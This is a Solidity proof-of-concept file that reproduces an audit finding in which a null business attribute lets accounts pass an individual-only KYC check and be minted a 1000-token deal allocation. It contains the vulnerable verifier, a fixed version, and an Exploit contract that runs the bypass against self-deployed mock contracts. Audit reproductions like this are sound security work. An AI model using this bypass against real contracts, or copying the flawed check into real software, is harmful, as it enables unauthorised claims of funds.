// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Tradable — QuadrataKYCVerifier null business attribute bypasses EntityType
    (Spearbit, finding 37958). SYNTHETIC, cheatcode-free.
    Root cause: isBusiness is `isBusinessEqual(true) && !expired`. A null
    business attribute (bytes32(0)) makes isBusinessEqual false, so an
    Individual-only deal never reverts and still pays the allocation.
    Vulnerable line preserved verbatim in spirit from QuadrataKYCVerifier
    L138-L148 (@> VULN). */

enum EntityType {
    Any,
    Individual,
    Business
}

contract DealToken {
    string public name = "Deal Allocation";
    string public symbol = "DEAL";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    address public minter;

    function setMinter(address m) external {
        require(minter == address(0), "minter set");
        minter = m;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract QuadrataReader {
    mapping(address => bytes32) public didOf;
    mapping(address => bytes32) public businessOf;
    mapping(address => bool) public expired;

    function setDID(address account, bytes32 did) external {
        didOf[account] = did;
    }

    function setBusiness(address account, bytes32 value) external {
        businessOf[account] = value;
    }

    function setExpired(address account, bool value) external {
        expired[account] = value;
    }

    /// Quadrata: only an explicit isBusiness=true attribute matches. Null is bytes32(0).
    function isBusinessEqual(bytes32 value, bool want) public pure returns (bool) {
        return value == bytes32(uint256(1)) && want;
    }

    function isExpired(address account) external view returns (bool) {
        return expired[account];
    }
}

error EntityTypeCheckFailed(address account);

contract QuadrataKYCVerifier {
    QuadrataReader public reader;
    DealToken public dealToken;
    EntityType public requiredType;
    uint256 public constant ALLOCATION = 1000 ether;
    mapping(address => bool) public eligible;

    constructor(QuadrataReader reader_, DealToken dealToken_, EntityType requiredType_) {
        reader = reader_;
        dealToken = dealToken_;
        requiredType = requiredType_;
    }

    function verifyEligibility(address account) external returns (bool) {
        bytes32 didAttribute = reader.didOf(account);
        require(didAttribute != bytes32(0), "no did");
        bytes32 businessAttribute = reader.businessOf(account);
        EntityType entityType = requiredType;
        if (entityType != EntityType.Any) {
            bool isBusiness = reader.isBusinessEqual(businessAttribute, true) && !reader.isExpired(account); // @> VULN: null business is not a business, so Individual deals skip both reverts
            if (entityType == EntityType.Individual && isBusiness) {
                revert EntityTypeCheckFailed(account);
            }
            if (entityType == EntityType.Business && !isBusiness) {
                revert EntityTypeCheckFailed(account);
            }
        }
        // FIX: require(businessAttribute != bytes32(0), "null attribute");
        dealToken.mint(account, ALLOCATION);
        eligible[account] = true;
        return true;
    }
}

contract QuadrataKYCVerifierFixed {
    QuadrataReader public reader;
    DealToken public dealToken;
    EntityType public requiredType;
    uint256 public constant ALLOCATION = 1000 ether;

    constructor(QuadrataReader reader_, DealToken dealToken_, EntityType requiredType_) {
        reader = reader_;
        dealToken = dealToken_;
        requiredType = requiredType_;
    }

    function verifyEligibility(address account) external returns (bool) {
        bytes32 didAttribute = reader.didOf(account);
        require(didAttribute != bytes32(0), "no did");
        bytes32 businessAttribute = reader.businessOf(account);
        require(businessAttribute != bytes32(0), "null attribute");
        EntityType entityType = requiredType;
        if (entityType != EntityType.Any) {
            bool isBusiness = reader.isBusinessEqual(businessAttribute, true) && !reader.isExpired(account);
            if (entityType == EntityType.Individual && isBusiness) revert EntityTypeCheckFailed(account);
            if (entityType == EntityType.Business && !isBusiness) revert EntityTypeCheckFailed(account);
        }
        dealToken.mint(account, ALLOCATION);
        return true;
    }
}

contract Exploit {
    QuadrataReader public reader; // nonce 1
    DealToken public dealToken; // nonce 2
    QuadrataKYCVerifier public verifier; // nonce 3

    constructor() {
        reader = new QuadrataReader();
        dealToken = new DealToken();
        verifier = new QuadrataKYCVerifier(reader, dealToken, EntityType.Individual);
        dealToken.setMinter(address(verifier));
    }

    function run() external {
        EntityType kind = verifier.requiredType();
        require(kind == EntityType.Individual, "deal must require Individual");
        reader.setDID(address(this), bytes32("did"));
        bytes32 businessAttribute = reader.businessOf(address(this));
        require(businessAttribute == bytes32(0), "business attribute stays null");
        bool ok = verifier.verifyEligibility(address(this));
        require(ok, "eligibility returned");
        require(verifier.eligible(address(this)), "marked eligible");
        require(dealToken.balanceOf(address(this)) == 1000 ether, "individual-only allocation paid");
    }
}
